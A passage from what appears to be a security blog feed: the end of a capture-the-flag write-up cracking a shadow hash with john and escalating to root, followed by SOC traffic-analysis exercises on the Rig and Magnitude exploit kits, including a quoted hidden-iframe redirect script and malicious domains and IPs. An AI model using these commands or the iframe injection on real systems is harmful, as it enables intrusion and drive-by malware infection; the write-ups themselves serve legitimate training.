&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;quarantine/shadow
...
maxine:&lt;span class=&quot;nv&quot;&gt;$6$/&lt;/span&gt;syu6s6/&lt;span class=&quot;nv&quot;&gt;$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm&lt;/span&gt;/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can crack the hash locally employed tools called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshadow maxine_passwd maxine_shadow &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; maxine_pass 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt maxine_pass
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$6$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA512 256/256 AVX2 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 5000 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Will run 4 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
tiarna           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;maxine&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:17 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-10-03 21:10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.05767g/s 4665p/s 4665c/s 4665C/s 070196..skyline123
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the cracked password, we can access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxine&lt;/code&gt; shell and run any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su maxine
Password: tiarna
maxine@lockdown:/home/cyrus&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su -
root@lockdown:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="web" /><category term="linux" /><category term="offensive" /><summary type="html">Summary We will retain the intial access by abusing the SQL injection vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the target system locally, we discover that cyrus user reuses the password stored in a config file, which we will use to compromise cyrus shell access. Finally, privilege escalation can be achieved via injecting clamscan’s rules.</summary></entry><entry><title type="html">2015/06/30 - Traffic Analysis</title><link href="https://jayngng.github.io/blog/20150630-traffic-analysis/" rel="alternate" type="text/html" title="2015/06/30 - Traffic Analysis" /><published>2021-09-29T04:12:43+10:00</published><updated>2021-09-29T04:12:43+10:00</updated><id>https://jayngng.github.io/blog/20150630---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/20150630-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;You’re working as an analyst at your organization’s Security Operations Center (SOC).  One of the other analysts was investigating alerts on a Windows host, and the computer is infected.  That analyst retrieved a pcap of network traffic from the associated IP address.&lt;/p&gt;

&lt;p&gt;You’ve been asked to review the pcap and answer the following questions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;What is the compromised website? &lt;br /&gt;&lt;/li&gt;
    &lt;li&gt;What is the exploit kit (EK) domain and IP address? &lt;br /&gt;&lt;/li&gt;
    &lt;li&gt;What is the redirect URL generated by the compromised website that leads to the exploit kit? &lt;br /&gt;&lt;/li&gt;
    &lt;li&gt;What is the post-infection traffic generated by the infected computer (in the pcap)? &lt;br /&gt;&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Link to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/06/30/2015-06-30-traffic-analysis-exercise.pcap.zip&quot;&gt;here&lt;/a&gt;. (Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Credit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;[1]. What is the compromised website?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;If we check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 13&lt;/code&gt;, a chain of infection starts from here.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.floridablueline.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/1.png&quot; title=&quot;20150630/1.png&quot; alt=&quot;20150630/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[2]. What is the exploit kit (EK) domain and IP address?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Domain: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;good.recycle2learn.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;46.30.45.65&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt; exposed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt; rules.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/2.png&quot; title=&quot;20150630/2.png&quot; alt=&quot;20150630/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[3]. What is the redirect URL generated by the compromised website that leads to the exploit kit?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://www.fernandatur.com/Scripts/hqnybx2w.php?id=960135&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Here is a piece of code that redirected the victim to land on the EK site.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.write(&apos;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://good.recycle2learn.com/?xniKfredLBvKDIU=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioXW_RGJN1hM-5DAFrE92lyjx-cUIsN2wR7QumAGzO0ZUEgbrA&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;left: -999px;top: -999px;position: absolute;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[4]. What is the post-infection traffic generated by the infected computer (in the pcap)?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Starting from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 18&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 25&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;The victime sent requests to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fpdownload2.macromedia.com&lt;/code&gt; and download a large. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fpdownload2.macromedia.com&lt;/code&gt; site is known for possibly delivering a trojan.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/3.png&quot; title=&quot;20150630/3.png&quot; alt=&quot;20150630/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Some abnormal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; traffic are generated to the external IP.&lt;/li&gt;
  &lt;li&gt;Search string: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udp&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Here is the result.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150630/4.png&quot; title=&quot;20150630/4.png&quot; alt=&quot;20150630/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We can safely conclude that a chain of infection occured as the victim landed on a compromised site, he was then exploited by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rig EK&lt;/code&gt;.&lt;/p&gt;</content><author><name></name></author><category term="ek" /><category term="blueteam" /><category term="traffic_analysis" /><summary type="html">Description You’re working as an analyst at your organization’s Security Operations Center (SOC).  One of the other analysts was investigating alerts on a Windows host, and the computer is infected.  That analyst retrieved a pcap of network traffic from the associated IP address.</summary></entry><entry><title type="html">2015 06 30 - Traffic Analysis</title><link href="https://jayngng.github.io/blog/2015-06-30-traffic-analysis/" rel="alternate" type="text/html" title="2015 06 30 - Traffic Analysis" /><published>2021-09-29T04:00:46+10:00</published><updated>2021-09-29T04:00:46+10:00</updated><id>https://jayngng.github.io/blog/2015-06-30---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/2015-06-30-traffic-analysis/"></content><author><name></name></author><category term="ek" /><category term="blueteam" /><category term="traffic_analysis" /><summary type="html"></summary></entry><entry><title type="html">Magnitude EK II- Traffic Analysis</title><link href="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/" rel="alternate" type="text/html" title="Magnitude EK II- Traffic Analysis" /><published>2021-09-26T19:24:17+10:00</published><updated>2021-09-26T19:24:17+10:00</updated><id>https://jayngng.github.io/blog/magnitude-ek---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/magnitude-ek-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Analyze the following packet and answer the questions.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Link to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/01/18/2015-01-18-traffic-analysis-exercise-2-of-2.pcap.zip&quot;&gt;here&lt;/a&gt;.
(Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Credit&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;question&quot;&gt;&lt;strong&gt;Question&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;For each pcap, answer the following questions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1) What is the date and time of the activity? &lt;br /&gt;
2) What is the IP address of the Windows host that gets infected?&lt;br /&gt;
3) What is the domain name and IP address of the compromised web site?&lt;br /&gt;
4) What is the domain name and IP address that delivered the exploit kit (EK)?&lt;br /&gt;
5) What is the name of the EK?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;rationale&quot;&gt;&lt;strong&gt;Rationale&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;[1]. &lt;strong&gt;What is the date and time of the activity?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2015-01-04 15:27:20&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/1.png&quot; title=&quot;magnitude/1.png&quot; alt=&quot;magnitude/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[2]. &lt;strong&gt;What is the IP address of the Windows host that gets infected?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.204.137&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/2.png&quot; title=&quot;magnitude/2.png&quot; alt=&quot;magnitude/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[3]. &lt;strong&gt;What is the domain name and IP address of the compromised web site?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;freeforsgames.com&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;188.227.165.20&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/3.png&quot; title=&quot;magnitude/3.png&quot; alt=&quot;magnitude/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;It redirects the victim to the EK site.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/4.png&quot; title=&quot;magnitude/4.png&quot; alt=&quot;magnitude/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[4]. &lt;strong&gt;What is the domain name and IP address that delivered the exploit kit (EK)?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Domain name:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20.c368.464.75b43b.e3161.dec8.033da1.8c.hl39dj2plwle.lowamounts.in&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.196.214.27&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;This is an EK website due to a chain of infections happening here. Also this website delivered a large size of payload.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/5.png&quot; title=&quot;magnitude/5.png&quot; alt=&quot;magnitude/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Inspecting the payload, we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;, but the body is Windows’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.exe&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/6.png&quot; title=&quot;magnitude/6.png&quot; alt=&quot;magnitude/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[5]. &lt;strong&gt;What is the name of the EK?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;analyse-the-traffic-with-suricata&quot;&gt;Analyse the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt;&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;On the terminal, we execute the following command:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;suricata &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; suricata2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2.pcap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;                          
25/9/2021 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; 19:02:02 - &amp;lt;Notice&amp;gt; - This is Suricata version 6.0.3 RELEASE running &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;USER mode
25/9/2021 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; 19:02:02 - &amp;lt;Info&amp;gt; - CPUs/cores online: 4
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fast.log&lt;/code&gt; file, we detect a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network Trojan&lt;/code&gt; claimed by multiple rules.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt; suricata2/fast.log
01/14/2015-10:27:28.580695  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:17] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
01/14/2015-10:27:34.974606  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020105:3] ET POLICY Possible IP Check ip-addr.es &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49296 -&amp;gt; 188.165.164.184:80
01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018959:4] ET POLICY PE EXE or DLL Windows file download HTTP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2016538:3] ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021076:2] ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
01/14/2015-10:27:36.757315  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:127] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49301 -&amp;gt; 5.196.214.27:80
01/14/2015-10:27:36.757746  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2031747:1] ET HUNTING Observed Interesting Content-Type Inbound &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;application/x-sh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49301
01/14/2015-10:27:30.413374  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:17] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
